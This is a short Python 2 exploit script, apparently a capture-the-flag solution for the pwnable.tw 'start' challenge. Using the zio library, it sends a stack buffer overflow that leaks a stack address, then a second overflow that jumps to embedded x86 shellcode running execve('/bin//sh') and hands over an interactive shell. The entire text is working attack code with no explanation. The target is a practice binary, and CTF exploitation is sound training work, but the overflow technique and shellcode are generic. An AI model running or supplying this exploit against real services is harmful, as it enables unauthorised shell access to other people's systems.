#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from sys import argv

conn = ("./start") if argv[1] == "l" else ("chall.pwnable.tw", 10000)
io = zio(conn, print_write = COLORED(RAW, "yellow"), print_read = COLORED(RAW, "red"), timeout = 10000)

io.read_until(":")
#  io.gdb_hint()
io.write('0' * 20 + l32(0x8048087))
#  io.read(size = 24)
stack = b32(io.read(size=4)[::-1])
print "\nstack -> {:#x}\n".format(stack)

shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

io.write('1' * 20 + l32(stack + 0x14) + shellcode)
#  io.write("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm")

io.interact()
io.close()
